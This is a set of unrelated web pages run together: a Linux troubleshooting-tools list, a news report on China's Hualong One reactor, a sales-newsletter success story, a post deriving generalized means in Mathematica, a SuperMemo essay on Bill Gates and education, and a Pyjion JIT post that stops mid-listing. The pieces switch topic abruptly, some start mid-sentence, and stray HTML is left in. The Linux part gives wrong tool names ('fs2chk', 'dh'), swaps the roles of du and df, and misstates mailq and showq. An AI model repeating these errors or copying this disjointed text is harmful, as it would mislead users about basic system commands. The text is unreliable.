<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Working in a Linux environment requires knowledge of Linux cli tools and troubleshooting. In this article, it would
be presented CLI tools that are most important for troubleshooting.
Short story
Let say you are working with Linux and your work would be: 1% once-time setup and 99% troubleshooting. So as we can see from these homemade statistics you going to spend most of your time in CLI and finding “why does not work”. This is not a trivial task. It requires knowledge of how Linux works, how subsystems of Linux works,
how complete “line” from typing command up to running, delivering some results works, logs.
Yes, logs are the most important.
So let me start with naming tools and then a short description of some of them.
fs2chk
du/dh
strace/ltrace
lsof
ldd
tcpdump
netstat
mailq/showq
traceroute/tracepath
ping/telnet/nc
dig
curl
nmap
top
ps
pkg manager(rpm, yum, apt, others)
lsmod
awk
sed
vim</p>
<h3>fs2chk</h3>
<p>Used for file system integrity check. Not all time you will have regular shutdown or reboot –
sometimes it happens power goes off and your server gets back with a file system issue. Usually, in that
case is best to use fs2chk</p>
<h3>du/dh</h3>
<p>Command du is used to show space usage per partition. Sometimes happen your partition are used with
some dumb files/logs (crash files) and you need to see what is happening because application or service you try to run report free space issue. Command dh is used to check directory with sub-
directories and discover what file occupied most of the space.</p>
<h3>strace/ltrace</h3>
<p>Running application it just stops at some point. You don’t have logs. Nothing. And there is no debug switch (for example ssh -vvv, where you can see all steps that are done) or any other way to see what is hell going on. So strace is for functions that is used and ltrace are library that are used at some point.
We mostly need trace tool to see details of operation for some applications. Example: we run applications or services and we see an issue and we are not sure why.</p>
<h3>lsof</h3>
<p>You have an issue removing files/files because they are used by some unknown application. Or you want to see how much is open files so you can see if the maximum limit for open files is reached.</p>
<h3>ldd</h3>
<p>When the application does not run at all – the usual suspect is missing the library. This tool is handy to discover which library missing.</p>
<h3>tcpdump</h3>
<p>Connection to server sometimes has issues. So the best way to check what is going on and to troubleshooting is tcpdump. You can pick up the interface, type of protocol, from/to IP, or any low level for all TCP/IP layers.</p>
<h3>netstat</h3>
<p>Simple to see the status of open ports, connection state, and other information that we need to see if services running properly on a given port.</p>
<h3>mailq/showq</h3>
<p>The most vital service in each company is email. And sometimes you need to see what is happening with email (sending or recv). Best tool for this is mailq/showq (it is the same tool, showq is a new one that replace
mailq on older Linux)</p>
<h3>ethtool</h3>
<p>On a low level could happen issue with our ethernet connection and we want to review our cable/port on Linux. So the tool is best for this job. Beside this, you can review other specific ethernet things (auto-negotiation etc)</p>
<h3>traceroute/tracepath</h3>
<p>Ideal to see between server and client if there is a network path issue as also a delay between them.</p>
<h3>ping/telnet/nc</h3>
<p>The very handy tool on the first step to see if is server up as also services.</p>
<h3>dig</h3>
<p>With this tool, you can perform all DNS troubleshooting. Review MX records, A, NS, etc.</p>
<h3>curl</h3>
<p>One of the best tools for troubleshooting different protocols: HTTP, RTMP, FTP, etc. It also has a benchmark integrated for a view of response (DNS, first byte, etc).</p>
<h3>nmap</h3>
<p>A very good tool for discovering services, open ports, and other useful information. Also, you can use on your servers to check if there is some unusual thing and secure them.</p>
<h3>top</h3>
<p>Active process list with memory, CPU, parent/child connection, and other information that helps to see where the issue starts.</p>
<h3>ps</h3>
<p>Process list, you can check and see what is currently running (very quick, the first step for troubleshooting)
pkg manager(rpm, yum, apt, others)
In troubleshooting we need to verify or to find some library or application – so this tool is best for that
operation.</p>
<h3>lsmod</h3>
<p>People who never have issues with kernel modules would never use this tool or get this tool seriously.
The tool provides information about loaded kernel modules as also usage, memory, etc.</p>
<h3>awk/sed/grep</h3>
<p>In a bunch of logs sometimes is a need to find proper information. All these tools are swiss knives for bash scripting and handy for parsing logs for specific information.</p>
<h3>vim</h3>
<p>The best editor in the world. Learn so you can answer on an interview how to quit vim.</p>

																				<p>BEIJING: China has powered up its first domestically developed nuclear reactor — Hualong One — a significant step in Beijing’s attempts to become less dependent on Western countries for energy security and critical technology.</p>
<p>The reactor, which was connected to the national grid on Friday, can generate 10 billion kilowatt-hours of electricity each year and cut carbon emissions by 8.16 million tonnes, according to China National Nuclear Corporation (CNNC).</p>
<p>“This marks China breaking the monopoly of foreign nuclear power technology and officially entering the technology’s first batch of advanced countries,” CNNC said in a statement.</p>
<p>Nuclear plants supplied less than 5% of China’s annual electricity needs in 2019, according to the National Energy Administration, but this share is expected to grow as Beijing attempts to become carbon-neutral by 2060.</p>
<p>Reducing its dependence on Western allies in critical high-tech sectors such as power generation is a key goal in Beijing’s “Made in China 2025” plan.</p>
<p>Billions of dollars in state subsidies have been given to Chinese companies to speed the process — a move that has angered China’s trade partners and sparked a protracted trade row with Washington.</p>
<p>Work on the Hualong One reactor started in 2015 and there are currently six other reactors under construction at home and abroad, the state-owned plant operator CNNC said.</p>
<p>The Hualong One, deployed at a plant in the eastern province of Fujian, will be put into commercial use by the end of the year after undergoing tests.</p>
<p>China has 47 nuclear plants with a total generating capacity of 48.75 Gigawatts — the world’s third highest after the United States and France.</p>
<p>Beijing has invested billions of dollars to develop its nuclear energy sector in recent years as it struggles to wean its economy from coal.</p>
<p>Thirteen nuclear plants are under construction, more than in any other country, despite environmental and safety concerns.</p>
<p>In August 2016, officials were forced to shelve plans for a nuclear waste facility in Lianyungang, a city in eastern Jiangsu province, after a rare public protest by thousands of residents.</p>									</div>

I went from phone jockey to deal-closer. On my nights and weekends, I was teaching myself to code.</p><p><br>One of those nights, I found Visualize Value on Twitter. The simple theories resonated with my action-oriented mindset. In particular, the idea of a <strong>Permissionless Apprenticeship</strong>.

I started doing “Free Sales Advice Friday,” and business owners would share what they were working on. I would reply with scrappy tactics to go out and find new customers, specifically for their business. </p><figure id="w-node-1ed3a476e59c-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec238bc87551cc41f9091_SBYXJoLLf8A93EpVRlXUzHAg9WB-jV66ry6jmT-imj15yB8FWSyI0I30xN_Vt3e7QVL4i0yxUoIDuQ_3pjeU_-buVwkKgWt-IVLB_ZmEOlzI91RTg3W6cdmATD8V6XMqsA.png" alt=""></p></figure><p>‍</p><p><em>"Some of the best help I've received online, thank you."&nbsp;—&nbsp;Jordan Godbey</em></p><p><em>"That is superb advice." —&nbsp;Andy Whyte</em></p><p><em>"Ryan, this thread is gold!"&nbsp;—&nbsp;Ben Ford<br>‍</em></p><p>I didn’t think too much of the feedback and kept working on my sales job. But I knew, mentally and emotionally, I was ready to make the leap into something of my own. I could code. I could sell. The pandemic provided the perfect reason to hide away for a year and hustle, nobody was hanging out without me anyhow.<br></p><p>In August, I quit my job, moved back to the farm to extend my runway, and committed myself to building. I felt like I had the skills I needed. The community was there through my sales work. I hadn’t realized it yet, but the community was there through Visualize Value as well.</p><p>I hoped salespeople would care about what I was building. <strong>As I applied my sales advice to my own software project, I found that more builders cared about how I approached sales. </strong>In months of Free Sales Advice Fridays, I advised 100+ business owners and explored so many different angles they could take.<br></p><p>There was already sales advice out on the internet. But the message didn’t matter to these people, the medium did. And I was the medium. To tap into that I built a small guide on pre-selling your product to customers and tested the offer of a premium newsletter. Then this happened:<br></p><figure id="w-node-b130da7c6edb-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec29f91c0ddef19a5840c_vO6r4tsysvvlePHfASruxWYEHU110pu8Z7TTAT-rcyVbeRxEeKK0YK0RFG3nqC-uqzIJA39A8_2JPvM3foisdyBXsYbgPiWzhz8M4AdWzt52IJ_F8zh6uK8xqSiwiZCEDw.png" alt=""></p></figure><p>On day 1, I hit $170 MRR. More revenue than I was making from my software project. Almost entirely profit. From what was already in my head. It was astonishing to me, that something so innate to me was worthy of an individual’s money.<br></p><h3>By sharing that innate knowledge through Free Sales Advice Friday, I was really embodying the permissionless apprenticeship. Every week I was able to hone my message in a zero-stakes, zero-permission environment. <br></h3><p>If I hadn’t sought out ways to provide free value, I wouldn’t have realize what people would pay me for. By the time I discovered what people wanted to pay for, I had built up enough “brand equity” for early adopters to trust me.<br></p><p>I’m still building my software projects. But my early adopters for my sales guides will allow me to do so with an audience who will test and support me, while paying me for the opportunity to do so.<br></p><p>I still do Free Sales Advice Fridays and stay active in the <a href="https://shop.visualizevalue.com/products/membership">Visualize Value Community</a>. When you join, look out for the weekly post in #general. Looking forward to giving you sales advice, too :)</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			<p>In school, we are first taught the arithmetic mean, then later the geometric mean, and maybe one or two others like the harmonic/contraharmonic mean.</p>
<p>But most teachers do not teach the logic or derivation behind these means. They merely provide the formulas and perhaps provide some scenarios where each mean would be more useful than the others.</p>
<p>I’d like to illustrate the definition of a mean, in the most abstract sense, from a programmer’s perspective, an algorithmic point of view.</p>
<h2>A Balancing Act</h2>
<hr>
<p>Suppose we have a list of N numbers, and a binary operation $f(a,b)$</p>
<p>If we apply that binary operation to one number from the list, we must&nbsp;apply its inverse operation to another number from the list.</p>
<p>We can continue applying $f$ to one element then $f^{-1}$ to another element as many times as we need to, until every number in the list is equal. That number that all elements are equal to…is the mean!</p>
<p>Means are just balancing acts!</p>
<p>** I am aware we haven’t specified the most&nbsp;optimized way to perform this algorithm to ensure it halts.</p>

<h2>Example</h2>
<hr>
<p>let our list be $(2,4,6)$ and our $f(a,b)=a+b$</p>
<p>then we apply the operation and its inverse to two elements respectively:</p>
<p>$(f(2,2), 4 ,f^{-1}(6,2)) = (2+2, 4 ,6-2) =&nbsp;(4,4,4)$</p>
<p>So our mean is 4.&nbsp;We just performed the&nbsp;<em>arithmetic mean</em>!</p>

<h2>What is it good for?</h2>
<hr>
<p>Well, given ANY invertible&nbsp;symmetric binary function, we can define a mean and derive its “shortcut” formula!</p>
<p>Here are the functions that define the means we usually come across:</p>
<p>arithmetic mean: $f(a,b) = a+b$<br>
geometric mean: $f(a,b) = ab$<br>
geometric mean (alternative definition): $f(a,b) = ln(a) + ln(b)$<br>
harmonic mean: $f(a,b) = 1/(1/a + 1/b)$</p>

<h2>Favoring Large or Small Numbers</h2>
<hr>
<p>Now, most of us learn that geometric mean tends to favor smaller&nbsp;numbers.</p>
<p>For example, the arithmetic mean of 1&nbsp;and 100 is $50\frac{1}{2}$. But the geometric mean of 1 and 100 is 10.</p>
<p>Knowing what we do now, can we create a mean that favors smaller numbers&nbsp;even more?</p>
<p>I don’t know if these already exist in the formal mathematics universe, ie. books or published papers. So let me know if you find a previous name for them!</p>
<p>Franken-mean: $f(a,b) = a^b b^a$</p>
<p>Franken-mean v2: $f(a,b) = a^b + b^a$</p>
<p>You might ask if we can skew our mean toward smaller numbers&nbsp;even more than our above exponential mean. We sure can. Using something called Tetration, simply put – it is iterated exponentiation. There are even operations that encompass iterated tetration and so on…these kind of operations are called&nbsp;hyperoperations. So we can make a mean skewed toward lows or highs as much as we want, and it’s beautiful isn’t it? Before different means are taught, the theory of what defines a mean should really be taught.</p>
<p>But before I forget,&nbsp;you must be saying: “Where’s my shortcut formulas?!!”</p>
<p>Okay okay.</p>

<h2>Deriving the Closed Formulas</h2>
<hr>
<p>Let’s derive the arithmetic mean first. Assume we have a list of 4 elements, ${x,y,z,t}$</p>
<p>Given the binary symmetric&nbsp;function that defines the arithmetic mean $f(a,b)=a+b$,</p>
<p>we let $g(a) = f(a,f(a,f(a,a))) = a + a + a + a = 4a$</p>
<p>Our formula for the mean of the 4 numbers in our list will be:</p>
<p>$g^{-1}(f(x,f(y,f(z,t))))$</p>
<p>We know $g(a) = 4a$, so $g^{-1}(a) = a/4$</p>
<p>That means our mean is $(x+y+z+t)/4$, which is what we expected from the arithmetic mean</p>
<p>Above was just a demonstration for a fixed size list of 4 elements. The concept is the same for any sized list. We can use induction to extrapolate what the formula will be for a list of n&nbsp;elements, $(x+y+z+t…….+w)/n$</p>

<h2>Mathematica code for the generalized mean</h2>
<hr>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
InverseFunction[
(Fold[f, ConstantArray[#, Length[l]]]) &amp;
] [Fold[f, l]]
);
</code></pre>
<ul>
<li>Arithmetic Mean
<pre id=""><code>In:= GeneralizedMean[{x,y,z,t},(#+#2)&amp;]
Out= 1/4 (t+x+y+z)</code></pre>
</li>
<li>Geometric Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (#*#2) &amp;]
Out= (t x y z)^(1/4)
</code></pre>
</li>
<li>Harmonic Mean
<pre id=""><code>In:= GeneralizedMean[{x, y, z, t}, (1/(1/# + 1/#2)) &amp;]
Out= 4/(1/t + 1/x + 1/y + 1/z)
</code></pre>
</li>
<li>Franken Mean v1
<pre id=""><code>In:= GeneralizedMean[{x, y}, (#^#2 * #2^#) &amp;]
Out= Log[x^y y^x]/(2 ProductLog[1/2 Log[x^y y^x]])
</code></pre>
</li>
</ul>
<p>I had to use 2 variables for the above, because Mathematica’s symbolic inverses aren’t strong enough.<br>
Franken Mean v2 does not even compute with symbolics or even numbers.<br>
I will eventually work on this to hopefully get at least numerics to work nomatter what.</p>
<h2>Alternative Implementation</h2>
<hr>
<p>This is an alternative implementation which seems to yield better results in some cases:</p>
<pre id=""><code>GeneralizedMean[l_List, f_Function] := (
Module[{x},
Solve[Fold[f, l] == Fold[f, ConstantArray[x, Length[l]]], x][[-1,
1, 2]]
]);
</code></pre>

<h2>Create your own means!</h2>
<hr>
<p>Enjoy creating your own means! Number theoretic means on lists of primes and that sort of stuff should be very interesting to explore, cheers!</p>

<p>But he restricted his construct to only functions of the form $f(a,b) = g(a) + g(b)$, where g is the function that determines the mean and is to be specified.</p>

</p>


<h2><span id="Bill_Gates_is_my_hero">Bill Gates is my hero</span></h2>
<p>Bill Gates was an early guiding light and <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">our</a> inspiration. When <a href="https://supermemo.guru/wiki/Krzysztof_Biedalak" title="Krzysztof Biedalak">Krzysztof Biedalak</a> and I made our first $3 investment in a corporate rubber stamp, which was a post-communist obligation for all companies in Poland in 1991, Microsoft was a multibillion-dollar company. How could we not have been blinded by inspiration? We wanted to write a universally useful piece of software and the world would be ours - we thought. Bill Gates's software philosophy, based on respect for backward compatibility, sheltered <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> on its path to its painfully slow adoption. Software and database compatibility have been preserved for 30 years now. My first pieces of knowledge in medical sciences, typed in on Dec 13, 1987, are still there in my collection, well-memorized and useful. Without Gates and his stance on compatibility, I would have lost all that knowledge to some upgrade hiccup long ago. When Gates moved to philanthropy, he has secured his place on my list of the greatest people who ever walked this planet. Perhaps as many as <a href="https://supermemo.guru/wiki/Bill_Gates_saved_over_100_million_children" title="Bill Gates saved over 100 million children">30-120 million kids have been saved by Bill's foundation</a>. This begs a vital question: Why is Gates so awfully wrong about education? Why does he fall for the same old myth that <a href="https://supermemo.guru/wiki/Myth:_You_can_improve_education_by_throwing_more_money_in_it" title="Myth: You can improve education by throwing more money in it">investing in education will produce better outcomes</a>? The education system is wrong and it must be redesigned. <a href="https://supermemo.guru/wiki/Compulsory_schooling_must_end" title="Compulsory schooling must end">Compulsory schooling must end</a>. See: <a href="https://supermemo.guru/wiki/Grand_Education_Reform" title="Grand Education Reform">Grand Education Reform</a>
</p>
<h2><span id="Could_Bill.27s_great_mind_be_wrong.3F">Could Bill's great mind be wrong?</span></h2>
<p>Everyone who disagrees with a great mind needs to pause and re-examine. Gates got sensational credentials. He sports a genius mind. He has seen more places that I could possibly ever manage to visit in Google Maps. He has spoken to more great people than I have had a chance to read about. He has visited more schools that I have seen on pictures. He started his forays into education in 1999. In contrast, I started thinking about "the system" only in 2016 when getting ready to write this <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">book</a>. This makes me into a fledgling with an immature point of view. Gates himself is a great example of a brisk student who has turned his skills and talents into a monumental achievement. His credentials are so much better than mine!
</p>
<h2><span id="Bill_Gates.27s_perspective">Bill Gates's perspective</span></h2>
<p>Could this just be that Gates's perspective is so much different than mine?
</p><p>He looks at the education system like at the operating system. Measure the performance, look for bottlenecks in the system, fix the parameter here and there, videotape a great teacher, and make others copy the method, and manufacture greatness.
</p><p>He looks at education like a philanthropic job. Like he treats health problems with mass vaccinations, he looks for a simple formula which could improve the education of the masses with some industrial move? He seems less focused on letting the brightest thrive, and more focused on preventing the weakest from dropping out. He wants to bring up the average using some <a href="https://supermemo.guru/wiki/Testing" title="Testing">standardized testing</a> approach.
</p><p>He looks at education like a big company that needs to be managed effectively with departments, and sub-departments. With a clear division of responsibility. <a href="https://supermemo.guru/wiki/Modern_schooling_is_like_Soviet_economy#Schooling_is_like_Soviet_Economy" title="Modern schooling is like Soviet economy">With an industrial goal in mind?</a>
</p><p>Could this be that this great capitalist shows more socialist thinking than a little well-indoctrinated ex-communist like myself?
</p><p>There is a different perspective of an employer and an employee, esp. in a creative position. Gates looks at the number of college graduates. I look for specific skills and creative powers. Actual degrees do not matter much if you take time to get into a particular brain.
</p><p>He looks at students like productive workers. The heretic idea of a longer school day must have come from the factory model thinking. Longer days, more production, more manufacturing.
</p><p>He looks at education from a societal point of view, while I look at the brain of an individual. He wants to move the masses to high achievement, while I want to produce more little Bill Gateses.
</p><p>Unlike myself, Bill Gates does not focus on having more Bill Gateses. He focuses on helping the poor, in boosting qualifications of the middle class, and adds "<i>you can't run a society on top 5%</i>". He is right, however, that top 5% can forge a path in education that would inspire all the rest. They cannot be run through a compulsory system set on pushing through the remaining 95%.
</p><p>Gates's approach would be great for some poorer countries (e.g. in Africa). Where there are no schools, industrial approach and good management could quickly improve health, eliminate poverty, and provide basic education.
</p><p>My approach is probably more suited to well-developed nations where the industrial approach makes people sick of schooling. With social awareness and education on the rise, we look for more little future Noble Prize winners and future Bill Gateses.
</p><p>His own kids get the best kind of learning. During his trips around the world, they get to visit places like the Large Hadron Collider at CERN. This could spark a life-long passion that could turn them into future particle physicists or another incarnation of <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a>.  
</p><p>Where Gates optimizes for improving the average, I am looking for the optimum of peak intellectual performance.
</p><p>Last but not least, could Gates's approach be an afterglow of his dropping out from Harvard. I see that over and over again, dropouts seem to suffer from this life-long hangover about what could have been? They tend to over-appreciate the power of schooling or the power of college. In the same way, I might be under-appreciating my own degrees. Gates is <a href="https://supermemo.guru/wiki/Thiel_on_competition_for_degrees" title="Thiel on competition for degrees">the opposite of Peter Thiel</a> who studiously climbed the educational ladder until he stumbled to see the light. Thiel is now one of the staunchest critics of college.
</p>
<h2><span id="Bill_Gates.27s_formula_for_success">Bill Gates's formula for success</span></h2>
<p>I see Gates's own life as a simple formula for success in science, engineering, or life in general:
</p>
<ul><li> healthy childhood of few concerns (preferably without the relegation to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>)</li>
<li> healthy approach to schooling with pranks, rebellions, disobedience, and freedom </li>
<li> minor trajectory nudges within the <a href="https://supermemo.guru/wiki/Push_zone" title="Push zone">push zone</a> by inspirational tutors. If tutors are not parents, this might be the most expensive part of the formula</li>
<li> breakthrough passion, e.g. for tinkering with computers or software</li>
<li> healthy education, possibly interrupted by some breakthrough decision (e.g. <i>Let me drop out from Harvard to set up the greatest software company in the world</i>)</li>
<li> relentless lifelong pursuit of goals born from that <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">youthful passion</a></li>
<li> voracious reading (see: <a href="https://supermemo.guru/wiki/Bill_Gates_and_his_non-incremental_reading" title="Bill Gates and his non-incremental reading">Bill Gates and his non-incremental reading</a>)</li></ul>
<p>Only Bill Gates truly knows it, but my understanding of his life story is that his future was determined by just one major factor: getting his hands on a computer. He was good at math and programming. So are dozens of kids in my neighborhood. My thinking comes from the fact that I was also strongly affected by my first contact with computers.
</p>

<p>When <a href="https://supermemo.guru/wiki/First_steps_of_SuperMemo" title="First steps of SuperMemo">I got my first computer in 1986</a>, ZX Spectrum, I was 24 and experienced wild elation with computer's obedience in executing my commands. I told the computer what to do, and it did it perfectly without asking questions. That was wonderful. I started writing my <a href="https://supermemo.guru/wiki/Plan" title="Plan">program for planning my day</a> on paper long before I got the computer on my desk. I was eager to see it work! As ZX Spectrum would load programs from a cassette tape, I could not easily dream of having <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>. It needed access to some disk drive. I got my first PC with a 360 KB <a href="https://en.wikipedia.org/wiki/Floppy_disk">floppy disk</a> drive only <a href="https://supermemo.guru/wiki/SuperMemo_1.0_for_DOS_(1987)" title="SuperMemo 1.0 for DOS (1987)">in 1987</a></p>
<p>The above hypothetical formula for educational success is simple and effective. Only a few might ever dream to replicate the scope of Bill's success. If that formula does not bring serial Nobel Prize winners, it should at least bring up a great deal of happy and fulfilled individuals. Freedom to explore the world is essential and it is denied to a great deal of kids in the modern world. When Peter Thiel pays kids to drop out from college, he looks for this type of free thinking experience that can change one life and then can change the world.
</p>
<h2><span id="My_attempt_at_employing_Gates.27s_formula">My attempt at employing Gates's formula</span></h2>

<p>I am happy with <a href="https://supermemo.guru/wiki/Exponential_adoption_of_spaced_repetition" title="Exponential adoption of spaced repetition">my achievements in life</a>. I have followed the formula employed by Gates. However, there were some exceptions. Perhaps I could use them as an excuse for not being as wildly successful as Bill? I was sent to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>, and I am sure this slowed down my development. The time I spent with my brother was more intellectual and inspirational by two orders of magnitude. However, he was a student and could not babysit the little me for ever. In later years, I was forced into a degree of conformity by an ever-present threat of being enlisted by the army in service of the Warsaw Pact. In 1986, I was finally free of the army service, and could finally drop out, however, I was not ready. There was no market economics culture in Poland of the 1980s. I read about entrepreneurial science in Science in 1989 (Oct 31, 1989). This was the first time when it occurred to me that my research into memory might actually be a seed of a business. Initially, though, my passions led me in the direction of a PhD. Schooling told me that science done by entrepreneurs is inferior to science done in academia. I thought of <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> as an opportunity to earn money for a trip to America. It seems that while Gates was fast to mature as a little entrepreneur, I needed 28 long years to even start thinking of my <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">own business</a>.</p>
<h2><span id="Reconciling_Gates_and_Woz">Reconciling Gates and Woz</span></h2>
<p>Gates wants better teachers, better education, verification, <a href="https://supermemo.guru/wiki/Testing" title="Testing">testing</a>, measuring, carrot-and-stick for teachers, etc. In contrast, I stand with Steve Jobs. Jobs told the kids to <a href="https://supermemo.guru/wiki/Fundamental_law_of_learning" title="Fundamental law of learning">rebel</a>!
</p><p>Gates believes that the key to the <a href="https://supermemo.guru/wiki/Reform" title="Reform">great future education system</a> is the teacher. He is almost right. If we could populate present schools with great teachers, I wouldn't ever need to write <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">this book</a>. The problem is that <a href="https://supermemo.guru/wiki/Progressive_education" title="Progressive education">a great teacher is simply a truly great man</a>. Great teaching requires a degree of genius. We need millions of those great people. How can we possibly hope to produce hundreds of thousands …</p></div></div>

            <div>
                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
